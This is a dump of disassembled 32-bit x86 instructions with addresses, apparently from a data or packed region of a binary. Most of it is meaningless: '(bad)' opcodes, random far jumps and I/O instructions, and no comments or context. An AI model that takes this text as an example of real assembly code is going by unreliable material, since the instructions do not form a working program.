  42d26c:	ins    DWORD PTR es:[edi],dx
  42d26d:	jmp    0x42d26f
	...
  42d2d3:	add    BYTE PTR [eax],al
  42d2d5:	add    BYTE PTR [ebp-0x2289a2f8],cl
  42d2db:	ja     0x42d28c
  42d2dd:	sti    
  42d2de:	aaa    
  42d2df:	out    0x36,eax
  42d2e1:	ja     0x42d270
  42d2e3:	and    BYTE PTR [edx+0x1e467c1],cl
  42d2e9:	add    BYTE PTR [eax],al
  42d2eb:	add    DWORD PTR [eax],eax
  42d2ed:	add    BYTE PTR [ebx+0x18054354],ch
  42d2f3:	pop    es
  42d2f4:	xchg   ebx,eax
  42d2f5:	adc    edi,DWORD PTR [ecx]
  42d2f7:	add    BYTE PTR [ebx+0x2c],bh
  42d2fa:	aad    0x74
  42d2fc:	imul   esi,DWORD PTR [edi],0xffffffdb
  42d2ff:	sbb    bl,BYTE PTR [ebx+0xa]
  42d302:	dec    edx
  42d303:	jnp    0x42d2e4
  42d305:	lods   eax,DWORD PTR ds:[esi]
  42d306:	scas   al,BYTE PTR es:[edi]
  42d307:	dec    edi
  42d308:	out    0x96,eax
  42d30a:	pop    edx
  42d30b:	dec    esi
  42d30c:	ss inc ebx
  42d30e:	and    ebp,DWORD PTR [edi+0x52741ec9]
  42d314:	repnz es retf 
  42d317:	out    dx,eax
  42d318:	push   esp
  42d319:	mov    al,ds:0xa475a503
  42d31e:	adc    al,0xa3
  42d320:	push   edi
  42d321:	int    0xab
  42d323:	pop    ds
  42d324:	enter  0xab38,0x40
  42d328:	sbb    bl,dl
  42d32a:	ffreep st(5)
  42d32c:	jbe    0x42d2b1
  42d32e:	push   esi
  42d32f:	jno    0x42d312
  42d331:	fwait
  42d332:	xor    DWORD PTR [edx],0x205ce5a4
  42d338:	and    BYTE PTR [edx],cl
  42d33a:	pop    eax
  42d33b:	or     BYTE PTR es:[ecx+0x1f716c9b],dl
  42d342:	or     al,0xbf
  42d344:	and    edi,esp
  42d346:	mov    ?,WORD PTR [eax+ebp*4-0x6aad3e9f]
  42d34d:	sub    DWORD PTR ds:0x86c9be71,edi
  42d353:	pop    ds
  42d354:	nop
  42d355:	pop    ds
  42d356:	xchg   ebx,eax
  42d357:	sub    al,0x24
  42d359:	imul   edi,edx,0x28c753cc
  42d35f:	popf   
  42d360:	xchg   DWORD PTR [ecx],edi
  42d362:	mov    bh,0x6c
  42d364:	xor    al,0xa
  42d366:	sub    al,0x1d
  42d368:	or     eax,0x4413f3f1
  42d36d:	and    DWORD PTR [edx],esi
  42d36f:	add    ecx,DWORD PTR [esi]
  42d371:	mov    ds:0xb4f3976e,eax
  42d376:	into   
  42d377:	jns    0x42d3e5
  42d379:	jo     0x42d361
  42d37b:	ficomp WORD PTR [ecx+esi*2-0x385b3655]
  42d382:	sub    al,0xf7
  42d384:	popa   
  42d385:	test   eax,0xa89768c1
  42d38a:	xchg   DWORD PTR [edi-0x27],edx
  42d38d:	cwde   
  42d38e:	sar    al,cl
  42d390:	daa    
  42d391:	imul   ecx,DWORD PTR fs:[edi+0x4e],0x20b49daf
  42d399:	inc    esi
  42d39a:	pop    esi
  42d39b:	xor    eax,0xb426a5af
  42d3a0:	repnz cmp ah,dl
  42d3a3:	push   ds
  42d3a4:	test   DWORD PTR [ebx],esi
  42d3a6:	xor    BYTE PTR [ecx-0xc4aa3e2],0xbc
  42d3ad:	cmp    ebp,DWORD PTR es:[esi+esi*1-0x22]
  42d3b2:	inc    esi
  42d3b3:	mov    ebp,0x4e559875
  42d3b8:	pop    ecx
  42d3b9:	stos   DWORD PTR es:[edi],eax
  42d3ba:	sar    edx,0xf4
  42d3bd:	cli    
  42d3be:	aad    0x40
  42d3c0:	sahf   
  42d3c1:	push   DWORD PTR [edx-0xb]
  42d3c4:	iret   
  42d3c5:	jp     0x42d41e
  42d3c7:	push   es
  42d3c8:	xchg   DWORD PTR [esi-0x43],ebp
  42d3cb:	mov    ds:0xcd5a29b3,eax
  42d3d0:	dec    esp
  42d3d1:	rcl    al,cl
  42d3d3:	(bad)
  42d3d6:	out    0x78,al
  42d3d8:	cmp    al,0xd6
  42d3da:	pop    esi
  42d3db:	(bad)  
  42d3dd:	(bad)  
  42d3de:	xor    BYTE PTR [edi-0x3fe50a96],bl
  42d3e4:	adc    bl,ah
  42d3e6:	xchg   BYTE PTR [edi-0x886cdb],al
  42d3ec:	iret   
  42d3ed:	out    dx,al
	...
  42d456:	ror    esi,0x63
  42d459:	cdq    
  42d45a:	outs   dx,DWORD PTR ds:[esi]
  42d45b:	mov    ebp,0x9459defb
  42d460:	aaa    
  42d461:	pushf  
  42d462:	sub    BYTE PTR [ebp-0x1a98762d],dh
  42d468:	add    DWORD PTR [eax],eax
  42d46a:	add    BYTE PTR [ecx],al
  42d46c:	add    BYTE PTR [eax],al
  42d46e:	mov    eax,0x7dbb755
  42d473:	(bad)  
  42d475:	cld    
  42d476:	push   0x9671ee48
  42d47b:	or     eax,0xf9e357ed
  42d480:	jmp    0x8bb7:0x9946a601
  42d487:	fmul   DWORD PTR [ebx+0xd9b3e1]
  42d48d:	stos   DWORD PTR es:[edi],eax
  42d48e:	call   0xadd49d7f
  42d493:	jnp    0x42d46c
  42d495:	dec    edi
  42d496:	je     0x42d4ff
  42d498:	je     0x42d443
  42d49a:	pop    esi
  42d49b:	push   edi
  42d49c:	jae    0x42d44b
  42d49e:	push   eax
  42d49f:	xor    DWORD PTR [edx-0x72],esp
  42d4a2:	add    BYTE PTR [esi-0x8a55145],0x74
  42d4a9:	shl    BYTE PTR [eax-0x7f],1
  42d4ac:	dec    ebx
  42d4ad:	inc    edi
  42d4ae:	shl    eax,0x60
  42d4b1:	jmp    0x63c49567
  42d4b6:	mov    dh,0xc1
  42d4b8:	(bad)  
  42d4b9:	sti    
  42d4ba:	in     eax,dx
  42d4bb:	sbb    bh,BYTE PTR [eax+0x75]
  42d4be:	push   edi
  42d4bf:	pushf  
  42d4c0:	pusha  
  42d4c1:	das    
  42d4c2:	cwde   
  42d4c3:	sub    bh,BYTE PTR [eax]
  42d4c5:	push   esi
  42d4c6:	enter  0x6059,0x31
  42d4ca:	mov    edx,0xb7ff2ffb
  42d4cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d4d0:	jp     0x42d4a7
  42d4d2:	loopne 0x42d4ab
  42d4d4:	sub    ecx,DWORD PTR [edi]
  42d4d6:	xchg   BYTE PTR [esi],ch
  42d4d8:	sbb    esp,DWORD PTR [ecx]
  42d4da:	inc    ecx
  42d4db:	rcr    ebx,cl
  42d4dd:	fdivr  QWORD PTR [edi+0x6c]
  42d4e0:	addr16 dec ebp
  42d4e2:	or     BYTE PTR [esi+0x39e56f0c],ah
  42d4e8:	aas    
  42d4e9:	add    esp,eax
  42d4eb:	dec    ebx
  42d4ec:	pop    eax
  42d4ed:	pop    ds
  42d4ee:	cld    
  42d4ef:	lds    edi,FWORD PTR [ebp+0x7c]
  42d4f2:	leave  
  42d4f3:	inc    ecx
  42d4f4:	xlat   BYTE PTR ds:[ebx]
  42d4f5:	mov    esi,0xa675fe2
  42d4fa:	aam    0xa2
  42d4fc:	jg     0x42d569
  42d4fe:	inc    edi
  42d4ff:	cdq    
  42d500:	inc    ecx
  42d501:	or     dl,0x30
  42d504:	(bad)  
  42d505:	sub    eax,0xf469d180
  42d50a:	xor    DWORD PTR [edi-0x65],ebx
  42d50d:	push   ds
  42d50e:	push   DWORD PTR [ecx-0x55]
  42d511:	lods   eax,DWORD PTR ds:[esi]
  42d512:	test   al,0x81
  42d514:	cwde   
  42d515:	pop    ds
  42d516:	xchg   BYTE PTR [ebp+0x74],bh
  42d519:	adc    al,0x79
  42d51b:	lods   al,BYTE PTR ds:[esi]
  42d51c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d51d:	xchg   esi,eax
  42d51e:	outs   dx,DWORD PTR ds:[esi]
  42d51f:	and    BYTE PTR [esi+0x51],bh
  42d522:	mov    cl,0x5a
  42d524:	sub    esp,DWORD PTR [ecx-0x12b71d64]
  42d52a:	jge    0x42d5a0
  42d52c:	jo     0x42d555
  42d52e:	mov    eax,ds:0x97a3ead8
  42d533:	pop    edi
  42d534:	test   DWORD PTR [ebp+0x14],edx
  42d537:	mov    ebp,DWORD PTR [ecx-0x3b819793]
  42d53d:	int    0xa6
  42d53f:	push   ds
  42d540:	add    al,0x7d
  42d542:	test   al,0xec
  42d544:	xchg   ecx,eax
  42d545:	sub    BYTE PTR [edi+eax*2-0x56],0xfc
  42d54a:	call   FWORD PTR [ecx-0x107174db]
  42d550:	int    0xd8
  42d552:	push   ebx
  42d553:	sub    bl,bl
  42d555:	jno    0x42d58e
  42d557:	rol    cl,1
  42d559:	mov    edi,ecx
  42d55b:	jae    0x42d593
  42d55d:	lods   eax,DWORD PTR ds:[esi]
  42d55e:	sub    eax,0xe79a3207
  42d563:	in     al,0xb7
  42d565:	push   0x7c
  42d567:	mov    ebp,0xd6cda34
  42d56c:	cmp    BYTE PTR [ebp+0x0],0x0
	...
  42d5d3:	add    BYTE PTR [eax],al
  42d5d5:	add    BYTE PTR [ecx-0x11ac7d0b],bl
  42d5db:	ja     0x42d5b6
  42d5dd:	call   FWORD PTR [ebp+0x3e]
  42d5e0:	mov    ds:0x725fbdd5,eax
  42d5e5:	adc    esp,DWORD PTR [edi-0x1a]
  42d5e8:	add    DWORD PTR [eax],eax
  42d5ea:	add    BYTE PTR [ecx],al
  42d5ec:	add    BYTE PTR [eax],al
  42d5ee:	sahf   
  42d5ef:	out    dx,al
  42d5f0:	test   al,0x72
  42d5f2:	mov    eax,0x15207045
  42d5f7:	loopne 0x42d5b7
  42d5f9:	lock xor bl,BYTE PTR [edx-0x18]
  42d5fd:	in     al,0xce
  42d5ff:	stos   DWORD PTR es:[edi],eax
  42d600:	and    al,0x17
  42d602:	in     eax,0xd2
  42d604:	sub    BYTE PTR [ecx-0x4d],bh
  42d607:	or     BYTE PTR [ebx+eiz*1+0x419a8e7d],bl
  42d60e:	mov    ds:0x1511628f,eax
  42d613:	and    BYTE PTR [ebx+eax*2],0x6b
  42d617:	mov    dh,0xed
  42d619:	xor    ebx,DWORD PTR [edx]
  42d61b:	dec    ebx
  42d61c:	dec    esp
  42d61d:	mov    bh,0xb3
  42d61f:	add    ah,BYTE PTR [edi+ecx*8+0x1]
  42d623:	push   ecx
  42d624:	test   eax,0x42b8dc80
  42d629:	lea    ecx,[eax+0x5c]
  42d62c:	(bad)  
  42d62d:	in     al,0x49
  42d62f:	fadd   QWORD PTR [eax-0x68]
  42d632:	addr16 jg 0x42d66e
  42d635:	mov    eax,0xf6e24a76
  42d63a:	mov    esp,0x2ef718ee
  42d63f:	push   ebp
  42d640:	sub    eax,eax
  42d642:	push   esi
  42d643:	lods   al,BYTE PTR ds:[esi]
  42d644:	mov    al,ds:0xce22543f
  42d649:	inc    BYTE PTR [eax-0x41]
  42d64c:	sub    eax,0x805b53a6
  42d651:	cs xchg esp,eax
  42d653:	std    
  42d654:	cmc    
  42d655:	and    ch,bl
  42d657:	jge    0x42d6a5
  42d659:	xchg   edi,eax
  42d65a:	xchg   BYTE PTR [eax-0x4897cf45],bh
  42d660:	fbld   TBYTE PTR [edi-0x61]
  42d663:	loopne 0x42d634
  42d665:	jb     0x42d607
  42d667:	ror    BYTE PTR [edx+esi*2],cl
  42d66a:	aas    
  42d66b:	stos   DWORD PTR es:[edi],eax
  42d66c:	data16 or BYTE PTR [eax-0x1a114c54],0x29
  42d674:	leave  
  42d675:	mov    ds:0x75a1ea0b,eax
  42d67a:	cmp    esp,DWORD PTR [ebx+edx*8-0x2086ceb0]
  42d681:	aaa    
  42d682:	pop    ecx
  42d683:	stos   BYTE PTR es:[edi],al
  42d684:	adc    bh,BYTE PTR [ebx+0x45]
  42d687:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d688:	ins    BYTE PTR es:[edi],dx
  42d689:	mov    eax,ds:0xbd1749ff
  42d68e:	stc    
  42d68f:	add    eax,0xb8ced638
  42d694:	(bad)  
  42d695:	stos   DWORD PTR es:[edi],eax
  42d696:	(bad)  
  42d697:	cmp    ch,bl
  42d699:	mov    esp,edi
  42d69b:	ret    
  42d69c:	sahf   
  42d69d:	shl    DWORD PTR [ebx+ecx*8-0x1af31d9a],0x8a
  42d6a5:	jnp    0x42d724
  42d6a7:	stc    
  42d6a8:	lock add eax,0x4f5e35e8
  42d6ae:	xchg   DWORD PTR [ebx+0x63d9d174],edx
  42d6b4:	xchg   edi,eax
  42d6b5:	sbb    BYTE PTR [eax-0x7],0x1b
  42d6b9:	and    ebx,DWORD PTR [esi-0xc0910]
  42d6bf:	shl    BYTE PTR [ebx],cl
  42d6c1:	nop
  42d6c2:	daa    
  42d6c3:	adc    al,0x9b
  42d6c5:	xchg   esi,eax
  42d6c6:	mov    bl,0xeb
  42d6c8:	sub    esp,0xefa2ccbb
  42d6ce:	mov    ah,0x8
  42d6d0:	mov    edx,0xa488855c
  42d6d5:	mov    ds:0x5bbda6aa,al
  42d6da:	int3   
  42d6db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d6dc:	sbb    eax,DWORD PTR [eax-0x6095e147]
  42d6e2:	out    0xf4,eax
  42d6e4:	jno    0x42d6fc
  42d6e6:	ins    DWORD PTR es:[edi],dx
  42d6e7:	pusha  
  42d6e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d6e9:	and    DWORD PTR [edi+0x279511],0x0
	...
  42d753:	add    BYTE PTR [eax],al
  42d755:	add    bl,dh
  42d757:	add    esp,DWORD PTR [eax]
  42d759:	(bad)  
  42d75a:	lock scas eax,DWORD PTR es:[edi]
  42d75c:	(bad)  
  42d75d:	jg     0x42d6e0
  42d75f:	in     al,0x2c
  42d761:	and    al,0xa1
  42d763:	aaa    
  42d764:	(bad)  
  42d766:	addr16 out 0x1,eax
  42d769:	add    BYTE PTR [eax],al
  42d76b:	add    DWORD PTR [eax],eax
  42d76d:	add    al,dl
  42d76f:	inc    edi
  42d770:	inc    edi
  42d771:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  42d773:	and    al,0x83
  42d775:	jb     0x42d7a3
  42d777:	imul   esi,ecx,0x3c
  42d77a:	mov    al,ds:0x4d44d525
  42d77f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d780:	jle    0x42d7fa
  42d782:	cmp    BYTE PTR [ebx],ch
  42d784:	and    al,0x11
  42d786:	xchg   edx,eax
  42d787:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d788:	xor    eax,0x2763b476
  42d78d:	adc    BYTE PTR [ebx+0x5b],ah
  42d790:	jnp    0x42d7c1
  42d792:	das    
  42d793:	pop    esp
  42d794:	clc    
  42d795:	mov    dh,0xec
  42d797:	cmp    ebx,DWORD PTR [esp+edi*1+0x1f825a61]
  42d79e:	dec    ebx
  42d79f:	repnz inc edi
  42d7a1:	inc    eax
  42d7a2:	push   es
  42d7a3:	xchg   dl,ch
  42d7a5:	jg     0x42d75f
  42d7a7:	les    ebp,FWORD PTR [esi+0x715d86db]
  42d7ad:	lds    edx,FWORD PTR [ebx+0x2f]
  42d7b0:	inc    edx
  42d7b1:	adc    eax,0x95a2f820
  42d7b6:	mov    ds:0xfc28f787,eax
  42d7bb:	sub    eax,esi
  42d7bd:	mov    al,0x92
  42d7bf:	fnstsw WORD PTR [eax]
  42d7c1:	jp     0x42d76c
  42d7c3:	jb     0x42d7d4
  42d7c5:	xlat   BYTE PTR ds:[ebx]
  42d7c6:	dec    edx
  42d7c7:	jl     0x42d7fa
  42d7c9:	xor    esi,edx
  42d7cb:	ja     0x42d83a
  42d7cd:	popa   
  42d7ce:	cmp    al,0x19
  42d7d0:	and    BYTE PTR [ecx+0x255b28f9],dl
  42d7d6:	int    0xb0
  42d7d8:	out    dx,eax
  42d7d9:	add    BYTE PTR [edi-0x6d],bh
  42d7dc:	add    ch,BYTE PTR [ebx]
  42d7de:	push   0x32
  42d7e0:	jb     0x42d818
  42d7e2:	and    DWORD PTR gs:[ebp+0x4b36892b],edx
  42d7e9:	xor    DWORD PTR [eax],eax
  42d7eb:	into   
  42d7ec:	mov    cl,0x5e
  42d7ee:	stos   BYTE PTR es:[edi],al
  42d7ef:	xchg   esi,eax
  42d7f0:	js     0x42d7fb
  42d7f2:	adc    ecx,DWORD PTR [ebp-0x2eb1f161]
  42d7f8:	sub    BYTE PTR [ebx+0x3],bl
  42d7fb:	jmp    0x45396bd3
  42d800:	push   edi
  42d801:	and    DWORD PTR [edx+esi*4-0x24],0xffffffa3
  42d806:	mov    DWORD PTR [edi+eiz*1-0x64],edi
  42d80a:	icebp  
  42d80b:	pushf  
  42d80c:	adc    cl,bh
  42d80e:	imul   BYTE PTR [ebp-0x28]
  42d811:	in     al,0xa8
  42d813:	jg     0x42d825
  42d815:	cmc    
  42d816:	ds pop ss
  42d818:	mov    eax,0x6f229bc1
  42d81d:	jnp    0x42d898
  42d81f:	push   0xffffffaa
  42d821:	dec    ecx
  42d822:	mov    ebp,DWORD PTR [ecx]
  42d824:	sbb    esp,esp
  42d826:	cmp    ebp,DWORD PTR [edx+0x7b]
  42d829:	lock inc ebx
  42d82b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d82c:	mov    esp,ebp
  42d82e:	mov    ah,0xfc
  42d830:	call   0xae49de53
  42d835:	xchg   edi,eax
  42d836:	add    bl,BYTE PTR [esp+eiz*4]
  42d839:	test   eax,0x7fd52d75
  42d83e:	xor    bh,BYTE PTR [ebx-0x2]
  42d841:	dec    eax
  42d842:	std    
  42d843:	popa   
  42d844:	mov    cl,0x7d
  42d846:	clc    
  42d847:	bound  eax,QWORD PTR [esi-0x7d]
  42d84a:	xor    DWORD PTR [eax+0x51c4587c],0x46176d70
  42d854:	cld    
  42d855:	pop    ecx
  42d856:	jo     0x42d877
  42d858:	push   ebx
  42d859:	adc    eax,0x51cefcb5
  42d85e:	or     eax,0x7f5777d4
  42d863:	rcl    bh,1
  42d865:	sbb    DWORD PTR ds:[ecx],ecx
  42d868:	mov    ebx,0xce247059
  42d86d:	stc    
	...
  42d8d6:	xchg   esi,eax
  42d8d7:	fwait
  42d8d8:	cwde   
  42d8d9:	pop    edi
  42d8da:	popf   
  42d8db:	pop    edi
  42d8dc:	xlat   BYTE PTR ds:[ebx]
  42d8dd:	fistp  DWORD PTR ds:0x39c6961a
  42d8e3:	scas   al,BYTE PTR es:[edi]
  42d8e4:	xor    al,0x81
  42d8e6:	addr16 call 0x142d8ed
  42d8ec:	add    BYTE PTR [eax],al
  42d8ee:	mov    bh,BYTE PTR [edx+esi*2]
  42d8f1:	repz and BYTE PTR es:[ebx+0x14],0x69
  42d8f7:	jbe    0x42d8e1
  42d8f9:	clc    
  42d8fa:	out    0xd9,al
  42d8fc:	in     al,dx
  42d8fd:	mov    DWORD PTR [ebx+0x7aab2a49],esi
  42d903:	out    dx,al
  42d904:	aaa    
  42d905:	push   ecx
  42d906:	dec    esp
  42d907:	sbb    eax,0xc7969062
  42d90c:	xchg   ebx,eax
  42d90d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d90e:	popa   
  42d90f:	mov    bl,0x60
  42d911:	test   BYTE PTR [edx+0x384a5e24],bl
  42d917:	(bad)
  42d91b:	dec    esi
  42d91c:	jmp    0xa9b65ae2
  42d921:	fmul   st,st(2)
  42d923:	adc    DWORD PTR [edi-0x62],0xaa99c18b
  42d92a:	mov    ecx,0x7664e98
  42d92f:	call   DWORD PTR [eax]
  42d931:	xor    BYTE PTR [ebp+ebx*4-0x3e7d4068],0x52
  42d939:	call   0x26fcc972
  42d93e:	push   ecx
  42d93f:	jns    0x42d944
  42d941:	gs push ebx
  42d943:	cwde   
  42d944:	mov    bl,0x50
  42d946:	or     BYTE PTR [ebp+0x4cca1475],dh
  42d94c:	or     eax,0xf3b20389
  42d951:	jg     0x42d939
  42d953:	mov    WORD PTR [esi],?
  42d955:	push   esp
  42d956:	out    dx,eax
  42d957:	xor    al,0xe1
  42d959:	push   es
  42d95a:	pop    esi
  42d95b:	adc    dl,BYTE PTR [ebx+0x4f]
  42d95e:	dec    edx
  42d95f:	adc    eax,0x237b96dd
  42d964:	fisttp DWORD PTR [ecx+0x6]
  42d967:	gs test eax,0xf306e210
  42d96d:	imul   eax,DWORD PTR [ebx+0x4e32c673],0x72
  42d974:	sub    esp,DWORD PTR [edx]
  42d976:	push   eax
  42d977:	aad    0x6
  42d979:	ret    
  42d97a:	mov    eax,ds:0xe6013178
  42d97f:	aas    
  42d980:	sbb    ebp,DWORD PTR [ebp+ebx*4-0x58]
  42d984:	mov    ds:0x9035d099,al
  42d989:	cmp    esi,eax
  42d98b:	shl    esp,1
  42d98d:	jae    0x42d9e4
  42d98f:	adc    DWORD PTR [esp+eiz*4],0x158cf41f
  42d996:	je     0x42d9cd
  42d998:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d999:	mov    ds:0xdf07a8f2,eax
  42d99e:	test   eax,0x721624bd
  42d9a3:	sbb    eax,0x94cd311f
  42d9a8:	push   ds
  42d9a9:	sub    eax,0xc690e062
  42d9ae:	xchg   DWORD PTR [ebx],esi
  42d9b0:	mov    edx,0xc5e1e231
  42d9b5:	test   cl,cl
  42d9b7:	jmp    0x5bbd:0xdd4175e1
  42d9be:	fisubr WORD PTR [eax+0x17]
  42d9c1:	inc    edx
  42d9c2:	jno    0x42d9c5
  42d9c4:	dec    esp
  42d9c5:	mov    esi,DWORD PTR [edx-0x5a]
  42d9c8:	test   eax,0x96df64de
  42d9cd:	push   ebx
  42d9ce:	jae    0x42da2d
  42d9d0:	pop    edi
  42d9d1:	xchg   ebx,eax
  42d9d2:	stc    
  42d9d3:	hlt    
  42d9d4:	or     dh,BYTE PTR [edi]
  42d9d6:	lock mov ah,0xf1
  42d9d9:	ja     0x42d989
  42d9db:	and    ah,dh
  42d9dd:	popa   
  42d9de:	jmp    0xeec:0x5ae8ea68
  42d9e5:	add    BYTE PTR [ecx],dh
  42d9e7:	js     0x42d9fa
  42d9e9:	loope  0x42d9c4
  42d9eb:	je     0x42d9ce
  42d9ed:	les    eax,FWORD PTR [eax]
	...
  42da53:	add    BYTE PTR [eax],al
  42da55:	add    cl,bh
  42da57:	mov    cl,0x70
  42da59:	dec    eax
  42da5a:	js     0x42da25
  42da5c:	stc    
  42da5d:	mov    cl,0xbf
  42da5f:	dec    edi
  42da60:	int    0xe1
  42da62:	repnz dec esp
  42da64:	mov    ch,0x11
  42da66:	addr16 jmp 0x142da6d
  42da6c:	add    BYTE PTR [eax],al
  42da6e:	sbb    BYTE PTR [edx+0x6b],al
  42da71:	hlt    
  42da72:	mov    dl,0xa5
  42da74:	mov    ecx,0x473ce41c
  42da79:	mov    BYTE PTR [edi],ah
  42da7b:	icebp  
  42da7c:	mov    ebx,0x689eba99
  42da81:	and    al,BYTE PTR [edi-0x5f1ae421]
  42da87:	lods   al,BYTE PTR ds:[esi]
  42da88:	inc    eax
  42da89:	dec    ebp
  42da8a:	loop   0x42da17
  42da8c:	mov    ebx,0xe6d7b430
  42da91:	lea    eax,[esi+0x5]
  42da94:	mov    ah,0x24
  42da96:	outs   dx,DWORD PTR ds:[esi]
  42da97:	sbb    eax,0x82f418b6
  42da9c:	mov    eax,ds:0x611c0f80
  42daa1:	add    edi,DWORD PTR [ecx]
  42daa3:	icebp  
  42daa4:	dec    edi
  42daa5:	loope  0x42da38
  42daa7:	sbb    DWORD PTR [ecx+edi*1+0x2b404285],edi
  42daae:	inc    eax
  42daaf:	out    0x8f,al
  42dab1:	or     BYTE PTR [ecx+0x6de190d7],0x67
  42dab8:	clc    
  42dab9:	and    eax,0x86803d1b
  42dabe:	pop    ecx
  42dabf:	inc    ebp
  42dac0:	shl    BYTE PTR [eax],0x81
  42dac3:	jo     0x42db05
  42dac5:	sub    eax,DWORD PTR [ebx-0x7f]
  42dac8:	mov    ds:0xe02eb62d,al
  42dacd:	rol    BYTE PTR [edi],cl
  42dacf:	jmp    0xcde26e98
  42dad4:	hlt    
  42dad5:	dec    ebx
  42dad6:	add    al,0xd7
  42dad8:	xchg   DWORD PTR [ecx],ecx
  42dada:	sti    
  42dadb:	(bad)  
  42dadc:	rcr    DWORD PTR [ebx],1
  42dade:	in     eax,dx
  42dadf:	mov    eax,edx
  42dae1:	leave  
  42dae2:	inc    eax
  42dae3:	test   DWORD PTR [edi+0x58b4bd45],esp
  42dae9:	mov    bh,0xd5
  42daeb:	call   0xac3b:0xe309ded8
  42daf2:	in     eax,dx
  42daf3:	sbb    dl,bl
  42daf5:	xlat   BYTE PTR es:[ebx]
  42daf7:	int3   
  42daf8:	leave  
  42daf9:	adc    edx,ebx
  42dafb:	add    eax,0x6e80494b
  42db00:	data16 xor bl,BYTE PTR [edi+0x718b7a0c]
  42db07:	aam    0xb3
  42db09:	inc    edx
  42db0a:	mov    dh,0xa8
  42db0c:	data16 cmc 
  42db0e:	test   BYTE PTR [ebp+0x46],dh
  42db11:	adc    eax,0x4b4985de
  42db16:	pop    es
  42db17:	icebp  
  42db18:	xchg   ebp,eax
  42db19:	scas   eax,DWORD PTR es:[edi]
  42db1a:	mov    ebx,0x61d1a9ad
  42db1f:	sbb    eax,0x3374be35
  42db24:	into   
  42db25:	xor    al,0xba
  42db27:	mov    WORD PTR [edx],cs
  42db29:	pusha  
  42db2a:	push   esp
  42db2b:	(bad)  
  42db2c:	cli    
  42db2d:	jb     0x42db7a
  42db2f:	push   ebp
  42db30:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  42db32:	ror    DWORD PTR [ecx+0x17],cl
  42db35:	dec    esi
  42db36:	loop   0x42dace
  42db38:	in     eax,0x74
  42db3a:	xor    DWORD PTR [edi],edx
  42db3c:	arpl   WORD PTR [esi+esi*1],sp
  42db3f:	fstp   QWORD PTR ds:0xc4a99dc5
  42db45:	jmp    0x4c0c:0x317f630d
  42db4c:	in     al,0x8
  42db4e:	hlt    
  42db4f:	ret    0xf0b3
  42db52:	int    0x42
  42db54:	clc    
  42db55:	lods   al,BYTE PTR ds:[esi]
  42db56:	repz sub eax,0x72cdab23
  42db5c:	adc    al,0x6a
  42db5e:	mov    bl,0xae
  42db60:	stos   DWORD PTR es:[edi],eax
  42db61:	das    
  42db62:	pop    eax
  42db63:	fst    DWORD PTR [esi+eax*4+0x2c]
  42db67:	scas   eax,DWORD PTR es:[edi]
  42db68:	mov    ch,ch
  42db6a:	bound  esi,QWORD PTR [eax+0x5900]
	...
  42dbd4:	add    BYTE PTR [eax],al
  42dbd6:	mov    al,0x7a
  42dbd8:	pop    ds
  42dbd9:	ins    BYTE PTR es:[edi],dx
  42dbda:	fild   QWORD PTR [ebp-0xd]
  42dbdd:	(bad)  
  42dbde:	fwait
  42dbdf:	jns    0x42db7c
  42dbe1:	jns    0x42db8f
  42dbe3:	dec    esp
  42dbe4:	jo     0x42db78
  42dbe6:	addr16 jmp 0x0:0x1000001
  42dbee:	pop    ecx
  42dbef:	pop    esi
  42dbf0:	jmp    0x78cf:0xe0900c8
  42dbf7:	add    eax,0xd421fae6
  42dbfc:	ret    
  42dbfd:	(bad)
  42dc00:	cs and eax,0xa27a77e2
  42dc06:	sbb    edi,DWORD PTR [edx-0x1f]
  42dc09:	fwait
  42dc0a:	xchg   ebx,eax
  42dc0b:	call   0x4d86:0x813cd298
  42dc12:	push   0x9
  42dc14:	cdq    
  42dc15:	or     edx,ebx
  42dc17:	fld    DWORD PTR [eax+0x1a]
  42dc1a:	std    
  42dc1b:	sub    ebp,DWORD PTR [edx-0xd189251]
  42dc21:	adc    BYTE PTR [edx-0x2d2409b],0x19
  42dc28:	(bad)  
  42dc29:	jle    0x42dc3a
  42dc2b:	ss xchg ch,al
  42dc2e:	inc    edx
  42dc2f:	ror    BYTE PTR [esi-0x3d3f9045],cl
  42dc35:	loop   0x42dc74
  42dc37:	(bad)  
  42dc38:	mov    bh,0xd5
  42dc3a:	inc    edi
  42dc3b:	sbb    eax,0xc94ef267
  42dc40:	xor    esp,DWORD PTR [edx-0x5997d93a]
  42dc46:	ret    
  42dc47:	mov    ecx,0x66f64220
  42dc4c:	dec    eax
  42dc4d:	mov    esp,0x7621910d
  42dc52:	pop    ebx
  42dc53:	ds mov ebx,0xf9062e0d
  42dc59:	inc    esi
  42dc5a:	mov    ds:0xb4c6bc49,al
  42dc5f:	push   cs
  42dc60:	je     0x42dc75
  42dc62:	js     0x42dc39
  42dc64:	sub    ebx,DWORD PTR [eax+ecx*1]
  42dc67:	mov    ah,0x23
  42dc69:	rcr    DWORD PTR [esi+0x45],1
  42dc6c:	cdq    
  42dc6d:	(bad)  
  42dc6e:	adc    ah,ch
  42dc70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dc71:	test   eax,0x592b1ccc
  42dc76:	aaa    
  42dc77:	lahf   
  42dc78:	cmc    
  42dc79:	addr16 aad 0xea
  42dc7c:	sbb    ch,BYTE PTR [esi+0x43]
  42dc7f:	popa   
  42dc80:	jp     0x42dc60
  42dc82:	mov    cl,al
  42dc84:	fwait
  42dc85:	and    BYTE PTR [bp+di-0x3d],ah
  42dc89:	and    al,0xd2
  42dc8b:	or     edx,DWORD PTR [ecx-0x59d89d61]
  42dc91:	dec    ebp
  42dc92:	mov    DWORD PTR [esi+0x24c269b3],0x5ea62397
  42dc9c:	les    eax,FWORD PTR [ebp+0x6b8062a0]
  42dca2:	(bad)
  42dca5:	xor    dl,bl
  42dca7:	mov    eax,0x5805894d
  42dcac:	pop    ds
  42dcad:	mov    DWORD PTR ds:0x2382fc26,ebp
  42dcb3:	add    al,0x77
  42dcb5:	xchg   esp,eax
